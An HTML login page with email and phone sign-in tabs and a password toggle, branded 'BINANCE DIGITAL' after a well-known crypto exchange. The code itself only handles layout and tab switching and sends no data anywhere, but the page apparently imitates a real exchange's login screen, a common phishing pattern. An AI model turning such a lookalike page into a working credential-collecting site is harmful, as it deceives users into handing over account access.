<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>

<link rel="stylesheet"
href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, sans-serif;
}

body{
    height:100vh;
    background:#111;
    color:#fff;
    display:flex;
    justify-content:center;
    align-items:center;
}

/* ================= MAIN CONTAINER ================= */

.login-wrapper{
    width:100%;
    max-width:420px;
    padding:25px;
    position:relative;
    overflow:hidden;
}

/* ================= FLOATING IMAGE ================= */

.bg-float{
    position:absolute;
    bottom:40px;
    right:-40px;
    width:260px;
    opacity:0.35;
    animation:float 4s ease-in-out infinite;
    pointer-events:none;
}

@keyframes float{
    0%{ transform:translateY(0px);}
    50%{ transform:translateY(-20px);}
    100%{ transform:translateY(0px);}
}

/* ================= HEADER ================= */

.logo{
    text-align:center;
    margin-bottom:15px;
}

.logo img{
    width:90px;
}

.brand{
    text-align:center;
    color:#f3b04b;
    font-size:22px;
    margin-bottom:30px;
}

/* ================= LOGIN SWITCH ================= */

.login-tabs{
    display:flex;
    justify-content:space-between;
    margin-bottom:25px;
}

.tab{
    flex:1;
    text-align:center;
    padding:10px;
    cursor:pointer;
    opacity:.6;
    border-bottom:2px solid transparent;
}

.tab.active{
    opacity:1;
    border-bottom:2px solid #fff;
}

/* ================= INPUT ================= */

.input-group{
    margin-bottom:18px;
}

.input-group label{
    font-size:13px;
    opacity:.8;
}

.input-box{
    margin-top:6px;
    display:flex;
    align-items:center;
    background:rgba(194,147,71,0.45);
    backdrop-filter:blur(6px);
    border-radius:10px;
    padding:14px;
}

.input-box i{
    margin-right:10px;
}

.input-box input{
    background:transparent;
    border:none;
    outline:none;
    color:#fff;
    width:100%;
    font-size:15px;
}

.eye{
    cursor:pointer;
}

/* ================= BUTTONS ================= */

.btn{
    width:100%;
    padding:15px;
    border-radius:30px;
    border:none;
    margin-top:15px;
    font-size:16px;
    cursor:pointer;
}

.signin{
    background:#f3b04b;
    color:#fff;
}

.signup{
    background:transparent;
    border:1px solid #fff;
    color:#fff;
}

/* ================= HIDE FORM ================= */

.form{
    display:none;
}

.form.active{
    display:block;
}

</style>
</head>

<body>

<div class="login-wrapper">

<img src="assets/images/wallet.png" class="bg-float">

<div class="logo">
    <img src="assets/images/logo.png">
</div>

<div class="brand">BINANCE DIGITAL</div>

<!-- LOGIN SWITCH -->
<div class="login-tabs">
    <div class="tab active" onclick="switchTab('email')">Email Login</div>
    <div class="tab" onclick="switchTab('phone')">Phone Login</div>
</div>

<!-- EMAIL LOGIN -->
<form class="form active" id="emailForm">

<div class="input-group">
<label>E-mail</label>
<div class="input-box">
<i class="fa-regular fa-envelope"></i>
<input type="email" placeholder="E-mail">
</div>
</div>

<div class="input-group">
<label>Password</label>
<div class="input-box">
<i class="fa-solid fa-lock"></i>
<input type="password" id="pass1" placeholder="Password">
<i class="fa-regular fa-eye eye"
onclick="togglePassword('pass1',this)"></i>
</div>
</div>

<button class="btn signin">Sign In</button>
<button type="button" class="btn signup">Sign Up</button>

</form>

<!-- PHONE LOGIN -->
<form class="form" id="phoneForm">

<div class="input-group">
<label>Phone number</label>
<div class="input-box">
<i class="fa-solid fa-phone"></i>
<input type="text" placeholder="+1 Phone number">
</div>
</div>

<div class="input-group">
<label>Password</label>
<div class="input-box">
<i class="fa-solid fa-lock"></i>
<input type="password" id="pass2" placeholder="Password">
<i class="fa-regular fa-eye eye"
onclick="togglePassword('pass2',this)"></i>
</div>
</div>

<button class="btn signin">Sign In</button>
<button type="button" class="btn signup">Sign Up</button>

</form>

</div>

<script>

/* TAB SWITCH */
function switchTab(type){

document.querySelectorAll('.tab')
.forEach(t=>t.classList.remove('active'));

event.target.classList.add('active');

document.querySelectorAll('.form')
.forEach(f=>f.classList.remove('active'));

if(type==='email')
document.getElementById('emailForm').classList.add('active');
else
document.getElementById('phoneForm').classList.add('active');
}

/* PASSWORD TOGGLE */
function togglePassword(id,icon){
let input=document.getElementById(id);

if(input.type==="password"){
input.type="text";
icon.classList.replace("fa-eye","fa-eye-slash");
}else{
input.type="password";
icon.classList.replace("fa-eye-slash","fa-eye");
}
}

</script>

</body>
</html>
